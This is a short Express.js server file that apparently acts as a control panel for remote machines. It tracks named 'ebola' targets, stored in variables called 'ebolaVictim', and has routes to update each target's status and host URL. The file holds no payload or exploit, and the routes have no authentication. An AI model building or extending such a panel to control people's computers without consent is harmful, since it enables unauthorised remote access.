const dotenv = require('dotenv');
const express = require('express');
const cors = require('cors');
const app = express();

const PORT = 4100;
dotenv.config();

app.set('view engine', 'ejs');
app.use(express.static(__dirname + '/public'));
app.use(express.json());
app.use(cors({ origin: true, credentials: true }));

let ebolas = [
	{
		name: 'plop pc',
		status: 'offline',
		host: 'http://192.168.1.153:4101',
	},
	{
		name: 'plop laptop',
		status: 'offline',
		host: '',
	},
	{
		name: 'ItsArctic',
		status: 'offline',
		host: '',
	},
	{
		name: 'wence',
		status: 'offline',
		host: '',
	},
];

app.get('/', (req, res) => {
	res.render('menu', { ebolas });
});
app.get('/test', (req, res) => {
	res.render('dashboard');
});
app.get('/control/*', (req, res) => {
	const ebola = ebolas.find(ebola => ebola.name.toLowerCase().split(' ').join('-') === req.url.split('control/')[1].toLowerCase());
	res.render('dashboard', { ebola });
});
app.post('/control/*', (req, res) => {
	const data = req.body;
	const ebolaVictim = ebolas.find(ebola => ebola.name.toLowerCase().split(' ').join('-') === req.url.split('control/')[1].toLowerCase());

	ebolaVictim.status = data.status;
	res.sendStatus(200);
});
app.post('/url/control/*', (req, res) => {
	const data = req.body;
	const ebolaVictim = ebolas.find(ebola => ebola.name.toLowerCase().split(' ').join('-') === req.url.split('control/')[1].toLowerCase());

	ebolaVictim.host = data.url;
	console.log(ebolaVictim);
	console.log(`new url: ${data.url}`);
	res.sendStatus(200);
});

app.listen(PORT, () => {
	console.log(`web app listening on port ${PORT}`);
});
